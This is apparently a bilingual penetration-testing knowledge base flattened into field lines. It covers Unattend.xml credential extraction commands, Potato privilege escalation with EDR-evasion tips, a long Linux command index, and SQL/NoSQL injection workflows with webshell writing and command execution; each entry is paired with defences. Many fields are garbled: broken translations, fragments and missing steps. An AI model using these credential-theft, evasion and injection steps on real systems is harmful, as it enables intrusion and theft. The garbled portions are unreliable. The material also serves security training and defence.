findstr /i /c:"Password" /c:"AutoLogon" /c:"AdminPassword" C:\Windows\Panther\Unattend.xml

# PowerShell提取
[xml]$xml = Get-Content C:\Windows\Panther\Unattend.xml
$xml.unattend.settings.component | Where-Object { $_.AutoLogon } | ForEach-Object { $_.AutoLogon.Password.Value }

description.zh: 从Unattend.xml中提取密码字段，密码可能以明文或Base64编码形式存储在<Password>/<AdminPassword>/<AutoLogon>节点中
description.en: Extract password fields from Unattend.xml; passwords may be stored as plaintext or Base64 in <Password>/<AdminPassword>/<AutoLogon> nodes

explanation.zh: 不区分大小写搜索指定字符串
自动登录配置(含明文密码)
将XML文件解析为PowerShell XML对象
explanation.en: will XMLFileParse is PowerShell XML for Object

execution.command:
# PowerShell解码Base64
$encoded = "QQBkAG0AaQBuAEAAMQAyADMA"  # 从XML提取的编码值
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))

# 或者使用certutil
echo QQBkAG0AaQBuAEAAMQAyADMA > C:\temp\encoded.txt
certutil -decode C:\temp\encoded.txt C:\temp\decoded.txt
type C:\temp\decoded.txt

description.zh: Unattend.xml中的密码如果以Base64编码存储，需要解码。Windows使用UTF-16LE编码，因此必须用Unicode解码而非ASCII
description.en: Passwords in Unattend.xml stored as Base64 need decoding. Windows uses UTF-16LE encoding, so Unicode decoding (not ASCII) is required

analysis.zh: 无人值守安装文件是Windows大规模部署的产物。这些XML文件中的<UserAccounts>/<AutoLogon>节点可能包含本地管理员或域管理员的明文/编码凭证。该漏洞在企业环境中极为常见，因为IT部门经常忽略部署后清理这些文件。
analysis.en: Unattended installation files are artifacts of large-scale Windows deployment. The <UserAccounts>/<AutoLogon> nodes in these XML files may contain local or domain admin plaintext/encoded credentials. This vulnerability is extremely common in enterprise environments because IT departments often neglect to clean up these files after deployment.

opsecTips.zh: 读取文件操作通常不会触发警报，但大量文件搜索(dir /s)可能被EDR检测。建议直接检查已知路径而非全盘搜索。
opsecTips.en: File read operations usually do not trigger alerts, but extensive file searches (dir /s) may be detected by EDR. Recommend checking known paths directly rather than searching all drives.

overview.zh: 无人值守安装文件(Unattend.xml)用于Windows自动化部署，可能包含管理员凭证。
overview.en: Unattended installation files (Unattend.xml) are used for automated Windows deployment and may contain admin credentials.

vulnerability.zh: Windows部署工具(如MDT、SCCM)生成的Unattend.xml文件中，密码以明文或弱编码(Base64)存储，且部署完成后文件常残留在系统中。
vulnerability.en: In Unattend.xml files generated by Windows deployment tools (e.g., MDT, SCCM), passwords are stored as plaintext or weakly encoded (Base64), and files often remain on the system after deployment.

exploitation.zh: 利用流程：1) 搜索默认路径下的Unattend/Sysprep文件 2) 提取Password/AutoLogon字段 3) 解码Base64密码 4) 使用获取的凭证横向移动
exploitation.en: Exploitationworkflow: 1) SearchDefaultPathBelow Unattend/SysprepFile 2) ExtractPassword/AutoLogonfield 3) DecodingBase64Password 4) UseObtain CredentialsLateral Movement

mitigation.zh: 防御措施：1) 部署完成后立即删除Unattend文件 2) 不在Unattend中存储域管理员密码 3) 使用LAPS管理本地管理员密码 4) 定期审计敏感文件
mitigation.en: Defenses: 1) Delete Unattend files immediately after deployment 2) Do not store Domain Admin passwords in Unattend files 3) Use LAPS for local admin passwords 4) Regularly audit sensitive files

description.en: Bypass EDR detection of Potato tools through reflective loading, renaming, using newer tools, and other methods

analysis.zh: Potato系列攻击利用Windows的令牌模拟机制——拥有SeImpersonatePrivilege的服务账户可以模拟向其认证的任何用户令牌。攻击者通过欺骗SYSTEM账户向本地COM服务器/命名管道认证，获取SYSTEM令牌后创建高权限进程。这是Web服务器(IIS)和数据库(SQL Server)提权最常见的方式之一。
analysis.en: The Potato family of attacks exploits the Windows token impersonation mechanism — service accounts with SeImpersonatePrivilege can impersonate the token of any user authenticating to them. Attackers trick the SYSTEM account into authenticating to a local COM server or named pipe, then use the SYSTEM token to create high-privilege processes. This is one of the most common privilege escalation methods for web servers (IIS) and databases (SQL Server).

opsecTips.zh: 1) Potato工具的二进制文件特征明显，建议内存加载 2) 创建的命名管道名称可能被监控 3) 成功后立即清理工具和临时文件 4) 避免使用net user等敏感命令，改用更隐蔽的后渗透方式
opsecTips.en: 1) Potato tool binaries have obvious signatures — recommend in-memory loading 2) Created named pipe names may be monitored 3) Clean up tools and temp files immediately after success 4) Avoid sensitive commands like net user; use stealthier post-exploitation methods

overview.zh: Potato系列是Windows环境下从服务账户提权到SYSTEM的经典攻击技术，利用令牌模拟和NTLM中继实现。
overview.en: The Potato family is a classic Windows privilege escalation technique from service accounts to SYSTEM, leveraging token impersonation and NTLM relay.

vulnerability.zh: Windows服务账户(IIS/SQL Server等)默认拥有SeImpersonatePrivilege权限。攻击者可利用此权限通过DCOM/命名管道欺骗SYSTEM账户认证，模拟其令牌实现提权。
vulnerability.en: Windows service accounts (IIS/SQL Server, etc.) have SeImpersonatePrivilege by default. Attackers can exploit this privilege through DCOM/named pipe to trick the SYSTEM account into authenticating, then impersonate its token for privilege escalation.

exploitation.zh: 利用流程：1) whoami /priv确认Impersonate权限 2) 根据系统版本选择合适的Potato工具 3) 执行Potato获取SYSTEM权限 4) 进行后渗透操作
exploitation.en: Exploitation workflow: 1) Confirm impersonation privileges with whoami /priv 2) Choose appropriate Potato tool based on system version 3) Execute Potato to obtain SYSTEM privileges 4) Perform post-exploitation

mitigation.zh: 防御措施：1) 最小权限原则，移除不必要的SeImpersonatePrivilege 2) 使用gMSA账户运行服务 3) 监控异常令牌操作和命名管道创建 4) 及时更新Windows补丁
mitigation.en: Defenses: 1) Principle of least privilege — remove unnecessary SeImpersonatePrivilege 2) Use gMSA accounts to run services 3) Monitor anomalous token operations and named pipe creation 4) Keep Windows patches up to date

commands.command:
# Python:
python3 -c "
import base64, json, sys
token = sys.argv[1]
parts = token.split('.')
for i, part in enumerate(parts[:2]):
    padded = part + '=' * (4 - len(part) % 4)
    decoded = base64.urlsafe_b64decode(padded)
    print(json.dumps(json.loads(decoded), indent=2))
" YOUR_JWT_HERE

description.zh: 枚举一台 Linux 主机实际 PATH、shell、man 数据库和包管理器暴露的全部命令。
description.en: Enumerate commands exposed by PATH, shell, man database, and package managers on an actual Linux host.

installation.zh: 在目标 Linux 实验机上运行；不同发行版和安装包会产生不同结果。
installation.en: Run on the target Linux lab host; results vary by distribution and installed packages.

commands.name: 枚举当前 shell 全部命令

description.zh: 列出当前 shell 能补全到的全部命令名。
description.en: List every command name completable by the current shell.

commands.name: 枚举 PATH 可执行文件

description.zh: 从 PATH 目录枚举可执行文件。
description.en: Enumerate executable files from PATH directories.

description.zh: 列出常见二进制目录里的命令。
description.en: List commands in common binary directories.

description.zh: 列出 Bash 内置命令。
description.en: List Bash builtins.

description.zh: 列出 man 数据库中可搜索的手册条目。
description.en: List searchable entries in the man database.

description.zh: 查看命令是内置、函数、别名还是可执行文件。
description.en: Show whether a command is a builtin, function, alias, or executable.

description.zh: 查看 shell 如何解析指定命令。
description.en: Show how the shell resolves a command.

description.zh: 查看 Debian 包安装了哪些命令。
description.en: Show commands installed by a Debian package.

description.zh: 查看 RPM 包安装了哪些命令。
description.en: Show commands installed by an RPM package.

description.zh: 列出 BusyBox 提供的 applets。
description.en: List applets provided by BusyBox.

description.zh: Bash/POSIX shell 内置命令帮助索引。
description.en: Help index for Bash/POSIX shell builtins.

installation.zh: 静态索引来自 POSIX/GNU、常见 Linux 发行版、systemd、iproute2、包管理、容器与开发工具；实际机器完整命令请配合“Linux 全命令动态枚举”。
installation.en: Static index based on POSIX/GNU utilities, common Linux distributions, systemd, iproute2, package managers, containers, and developer tools; use Linux full-command discovery for an exact host inventory.

description.zh: systemd、进程、用户、权限、日志、内核、审计和磁盘管理命令手册索引。

description.zh: 覆盖 Linux 文件、目录、权限、系统信息、磁盘和基础运维命令，适合课堂实验环境做命令速查。
description.en: Broad reference for Linux file, directory, permission, system information, disk, and basic operations commands.

installation.zh: Linux 发行版内置命令为主，常见依赖包括 coreutils、findutils、util-linux、procps。
installation.en: Mostly built in on Linux distributions; common packages include coreutils, findutils, util-linux, and procps.

description.zh: 显示当前 shell 所在目录。
description.en: Print the current working directory.

description.zh: 以人类可读大小列出隐藏文件和详细属性。
description.en: List hidden files with detailed metadata and human-readable sizes.

description.zh: 显示 inode，便于排查硬链接和文件系统问题。
description.en: Show inode numbers for hard-link and filesystem troubleshooting.

description.zh: 进入常见系统日志目录。
description.en: Change into a common system log directory.

description.zh: 按两层深度展示目录结构。
description.en: Display a directory tree with depth limited to two levels.

description.zh: 在 /etc 下查找常见配置文件。
description.en: Find common configuration files under /etc.

description.zh: 使用 locate 数据库快速查找文件路径。
description.en: Search indexed file paths with locate.

description.zh: 显示文件权限、时间戳、inode 等元数据。
description.en: Show permissions, timestamps, inode, and other file metadata.

description.zh: 根据魔术字节识别文件类型。
description.en: Identify file type using magic bytes.

description.zh: 创建空文件或更新时间戳。
description.en: Create an empty file or update timestamps.

description.zh: 创建不存在的父目录和目标目录。
description.en: Create parent directories and the target directory if missing.

description.zh: 递归复制并保留权限、时间戳等属性。
description.en: Copy recursively while preserving permissions and timestamps.

description.zh: 增量同步目录内容，适合备份和迁移实验。
description.en: Synchronize directories incrementally for backup or migration labs.

description.zh: 移动或重命名文件。
description.en: Move or rename a file.

description.zh: 删除前逐项确认，避免误删。
description.en: Prompt before removing a file to avoid mistakes.

description.zh: 创建指向目标路径的符号链接。
description.en: Create a symbolic link to a target path.

description.zh: 不解压直接列出 tar 归档内容。
description.en: List tar archive contents without extracting.

description.zh: 将目录打包为 gzip 压缩 tar 文件。
description.en: Package a directory into a gzip-compressed tar archive.

description.zh: 压缩文件并保留原始文件。
description.en: Compress a file while keeping the original input.

description.zh: 列出 zip 文件内容但不解压。
description.en: List zip archive contents without extracting.

description.zh: 查看当前目录下各项磁盘占用。
description.en: Show disk usage for entries in the current directory.

description.zh: 查看挂载文件系统类型和剩余空间。
description.en: Show mounted filesystem types and free space.

description.zh: 查看磁盘、分区、文件系统和 UUID。
description.en: Show disks, partitions, filesystems, and UUIDs.

description.zh: 以树状方式查看挂载关系。
description.en: Show mount relationships as a tree.

description.zh: 按最小权限原则设置文件读写权限。
description.en: Set file permissions with a least-privilege mode.

description.zh: 修改文件属主和属组。
description.en: Change file owner and group.

description.zh: 查看扩展访问控制列表。
description.en: Show extended access control lists.

description.zh: 为指定用户增加只读 ACL。
description.en: Grant a read-only ACL entry to a specific user.

description.zh: 显示当前用户 UID、GID 和组信息。
description.en: Show the current user UID, GID, and group membership.

description.zh: 查看当前登录会话。
description.en: Show current login sessions.

description.zh: 查看登录用户、运行命令和系统负载。
description.en: Show logged-in users, active commands, and load averages.

description.zh: 查看最近 20 条登录记录。
description.en: Show the latest 20 login records.

description.zh: 查看 Linux 发行版信息。
description.en: Show Linux distribution information.

description.zh: 查看内核、架构和主机信息。
description.en: Show kernel, architecture, and host information.

description.zh: 查看主机名、内核、虚拟化和系统版本信息。
description.en: Show hostname, kernel, virtualization, and OS information.

description.zh: 查看时区、NTP 和系统时间状态。
description.en: Show timezone, NTP, and system clock status.

description.zh: 列出当前环境变量。
description.en: List current environment variables.

description.zh: 枚举一台 Linux 主机实际 PATH、shell、man 数据库和包管理器暴露的全部命令。
description.en: Enumerate commands exposed by PATH, shell, man database, and package managers on an actual Linux host.

installation.zh: 在目标 Linux 实验机上运行；不同发行版和安装包会产生不同结果。
installation.en: Run on the target Linux lab host; results vary by distribution and installed packages.

commands.name: 枚举当前 shell 全部命令

description.zh: 列出 Bash 内置命令。
description.en: List Bash builtins.

description.zh: 列出 man 数据库中可搜索的手册条目。

description.zh: 查看命令是内置、函数、别名还是可执行文件。

description.zh: 查看 RPM 包安装了哪些命令。

overview.zh: MySQL注入是最常见的数据库注入类型，通过构造恶意SQL语句获取或修改数据库数据。攻击者可以利用注入漏洞读取敏感数据、写入WebShell甚至执行系统命令。
overview.en: MySQL injection is the most common type of database injection, obtaining or modifying database data by constructing malicious SQL statements. Attackers can exploit injection vulnerabilities to read sensitive data, write webshells, or even execute system commands.

vulnerability.zh: 应用程序未对用户输入进行充分过滤，直接拼接到SQL语句中执行。常见于搜索框、登录表单、URL参数等输入点。
vulnerability.en: The application does not adequately filter user input, directly concatenating it into SQL statements for execution. Commonly found in search boxes, login forms, URL parameters, and other input points.

exploitation.zh:
完整利用流程：
1. 探测注入点：使用单引号、布尔条件确认是否存在注入
2. 确定列数：使用ORDER BY或UNION SELECT NULL
3. 确定显示位置：找出哪些列会回显到页面
4. 获取数据库信息：database()、user()、version()
5. 枚举数据库结构：information_schema库
6. 提取敏感数据：用户名、密码等
7. 尝试提权：文件读写、UDF提权
exploitation.en:
Full exploitation workflow:
1. Detect injection point: use single quotes and boolean conditions to confirm injection
2. Determine column count: use ORDER BY or UNION SELECT NULL
3. Identify display positions: find which columns are reflected on the page
4. Retrieve database info: database(), user(), version()
5. Enumerate database structure: information_schema
6. Extract sensitive data: usernames, passwords, etc.
7. Attempt privilege escalation: file read/write, UDF privilege escalation

mitigation.zh:
防御措施：
1. 使用参数化查询(PDO、预处理语句)
2. 输入验证和白名单过滤
3. 最小权限原则，限制数据库用户权限
4. 禁用或限制FILE权限
5. 设置secure_file_priv为NULL
6. 部署WAF防护
7. 错误信息不泄露数据库详情
mitigation.en:
Defenses:
1. Use parameterized queries (PDO, prepared statements)
2. Input validation and whitelist filtering
3. Principle of least privilege: restrict database user permissions
4. Disable or restrict FILE privileges
5. Set secure_file_priv to NULL
6. Deploy WAF protection
7. Prevent error messages from leaking database details

overview.zh: MySQL高级注入技术可以实现文件读取、WebShell写入甚至系统命令执行。这些技术需要较高的数据库权限和特定的配置条件。
overview.en: MySQL advanced injection techniques can achieve file reading, webshell writing, and even system command execution. These techniques require elevated database privileges and specific configuration conditions.

vulnerability.zh: MySQL的FILE权限允许读写文件，配合secure_file_priv配置不当可导致严重后果。UDF提权可以执行任意系统命令。
vulnerability.en: MySQL\'s FILE privilege allows file read/write operations. Combined with misconfigured secure_file_priv, this can lead to severe consequences. UDF privilege escalation can execute arbitrary system commands.

exploitation.zh:
完整利用流程：
1. 检测FILE权限和secure_file_priv配置
2. 获取网站绝对路径
3. 使用load_file读取敏感配置
4. 使用INTO OUTFILE写入WebShell
5. 如果OUTFILE被禁，使用日志写Shell
6. 尝试UDF提权获取系统Shell
exploitation.en:
Full exploitation workflow:
1. Check FILE privilege and secure_file_priv configuration
2. Obtain the website absolute path
3. Use load_file to read sensitive configurations
4. Use INTO OUTFILE to write a WebShell
5. If OUTFILE is disabled, use log-based shell writing
6. Attempt UDF privilege escalation to obtain a system shell

mitigation.zh:
防御措施：
1. 限制FILE权限，不给Web应用用户
2. 设置secure_file_priv=NULL禁止文件操作
3. 禁用INTO OUTFILE和INTO DUMPFILE
4. 使用AppArmor/SELinux限制MySQL文件访问
5. 监控异常的文件读写操作
mitigation.en:
Defenses:
1. Restrict FILE privilege; do not grant it to web application users
2. Set secure_file_priv=NULL to disable file operations
3. Disable INTO OUTFILE and INTO DUMPFILE
4. Use AppArmor/SELinux to restrict MySQL file access
5. Monitor for anomalous file read/write operations

vulnerability.en: The application does not adequately filter user input, directly concatenating it into SQL statements for execution. MSSQL-specific stored procedures increase the attack surface.

exploitation.zh:

overview.zh: MSSQL高级注入利用xp_cmdshell和SP_OACREATE等存储过程可以执行系统命令，实现完全控制服务器。
overview.en: MSSQL advanced injection leverages stored procedures such as xp_cmdshell and SP_OACREATE to execute system commands and achieve full server control.

vulnerability.zh: MSSQL高级注入利用数据库特有功能如xp_cmdshell存储过程执行系统命令、OPENROWSET进行带外数据外泄、利用堆叠查询执行多条SQL语句。MSSQL的错误信息通常较为详细，可通过错误注入提取数据库版本、表结构等敏感信息。
vulnerability.en: Advanced MSSQL injection leverages database-specific features such as xp_cmdshell stored procedure for OS command execution, OPENROWSET for out-of-band data exfiltration, and stacked queries for executing multiple SQL statements. MSSQL error messages are typically verbose, allowing extraction of database version, table structure, and other sensitive information through error-based injection.

exploitation.zh:
完整利用流程：
1. 检测当前用户权限
2. 尝试开启xp_cmdshell

4. 写入WebShell或添加用户
5. 如果xp_cmdshell被禁，尝试SP_OACREATE

Full exploitation workflow:
1. Check current user privileges
2. Attempt to enable xp_cmdshell
3. Execute system commands
4. Write a WebShell or add a user
5. If xp_cmdshell is disabled, try SP_OACREATE

mitigation.zh:
防御措施：
1. 禁用xp_cmdshell和Ole Automation Procedures
2. 使用最小权限账户
3. 使用存储过程封装业务逻辑
4. 部署WAF防护
mitigation.en:
Defenses:
1. Disable xp_cmdshell and Ole Automation Procedures
2. Use least-privilege accounts
3. Encapsulate business logic in stored procedures
4. Deploy WAF protection

vulnerability.zh: Oracle高级漏洞包括：通过UTL_HTTP/UTL_INADDR进行DNS带外数据外泄，利用DBMS_XMLGEN构造报错回显，PL/SQL注入绕过单语句限制，以及Java存储过程提权执行系统命令。

Full exploitation workflow:

3. Or use UTL_FILE to read/write files

mitigation.zh: 防御Oracle高级注入需要：限制数据库用户权限(撤销UTL_HTTP、DBMS_XMLGEN等包的EXECUTE权限)，启用Oracle审计功能，使用绑定变量而非字符串拼接，配置网络ACL限制出站连接。
mitigation.en: Defending against advanced Oracle injection requires: restricting database user privileges (revoking EXECUTE permissions on UTL_HTTP, DBMS_XMLGEN, and similar packages), enabling Oracle auditing, using bind variables instead of string concatenation, and configuring network ACLs to restrict outbound connections.

overview.zh: PostgreSQL注入与其他数据库类似，但有其特有的函数和语法。PostgreSQL提供了丰富的文件操作函数。
overview.en: PostgreSQL injection is similar to other databases but has unique functions and syntax. PostgreSQL provides rich file manipulation functions.

vulnerability.zh: PostgreSQL注入利用其丰富的类型转换系统和函数库：通过CAST/类型转换触发报错回显，利用pg_sleep()实现延时盲注，COPY TO/FROM进行文件读写操作，以及通过PL/pgSQL创建自定义函数执行系统命令。
vulnerability.en: PostgreSQL injection exploits its rich type casting system and function library: triggering error-based data extraction via CAST/type conversion, using pg_sleep() for time-based blind injection, performing file read/write operations with COPY TO/FROM, and executing system commands through custom PL/pgSQL functions.

overview.zh: SQLite是嵌入式数据库引擎，广泛用于移动应用、桌面软件和小型Web应用。其注入测试需要了解SQLite特有的语法和系统表(sqlite_master)结构。
overview.en: SQLite is an embedded database engine widely used in mobile apps, desktop software, and small web applications. Injection testing requires understanding SQLite-specific syntax and system table (sqlite_master) structure.

vulnerability.zh: SQLite注入的特殊性在于：通过sqlite_master表枚举所有表和视图定义，使用typeof()确定列类型，利用group_concat()聚合多行数据，ATTACH DATABASE可创建新数据库文件实现写文件操作。
vulnerability.en: SQLite injection is unique in that: the sqlite_master table is used to enumerate all table and view definitions, typeof() determines column types, group_concat() aggregates multiple rows, and ATTACH DATABASE can create new database files to achieve file write operations.

exploitation.zh: SQLite注入利用步骤：1)通过sqlite_master获取表结构 2)使用UNION SELECT提取数据 3)利用ATTACH DATABASE写入webshell到可访问目录 4)或通过load_extension()加载恶意共享库执行代码。
exploitation.en: SQLite injection exploitation steps: 1) Retrieve table structure via sqlite_master 2) Extract data using UNION SELECT 3) Write a webshell to an accessible directory using ATTACH DATABASE 4) Or load a malicious shared library via load_extension() to execute code.

mitigation.zh: 防御SQLite注入：使用参数化查询(PreparedStatement)，严格验证和过滤用户输入，限制数据库文件权限防止ATTACH操作，禁用load_extension()功能，将数据库文件存放在Web根目录之外。
mitigation.en: Defend against SQLite injection: use parameterized queries (PreparedStatement), strictly validate and filter user input, restrict database file permissions to prevent ATTACH operations, disable load_extension(), and store database files outside the web root directory.

overview.zh: MongoDB是最流行的NoSQL数据库之一，其查询使用JSON格式而非SQL语法。NoSQL注入通过操纵查询运算符($gt/$ne/$regex等)来绕过认证或提取数据，攻击面与传统SQL注入截然不同。
overview.en: MongoDB is one of the most popular NoSQL databases, using JSON-format queries instead of SQL syntax. NoSQL injection manipulates query operators ($gt/$ne/$regex, etc.) to bypass authentication or extract data, presenting a fundamentally different attack surface from traditional SQL injection.

vulnerability.zh: MongoDB注入利用JSON查询运算符绕过认证：$ne(不等于)绕过密码验证、$gt(大于)匹配任意值、$regex进行正则盲注提取数据、$where注入JavaScript代码执行服务端脚本，以及聚合管道注入进行复杂数据操作。
vulnerability.en: MongoDB injection leverages JSON query operators to bypass authentication: $ne (not equal) bypasses password validation, $gt (greater than) matches any value, $regex performs regex-based blind data extraction, $where injects JavaScript for server-side script execution, and aggregation pipeline injection enables complex data manipulation.

exploitation.zh:
完整利用流程：
1. 探测注入点

exploitation.en:
Full exploitation workflow:
1. Detect injection points
2. Bypass authentication using operators
3. Extract data character by character using regex
4. Attempt JavaScript execution via $where

3. 禁用$where操作符

mitigation.en:

3. Disable$whereoperationSymbol
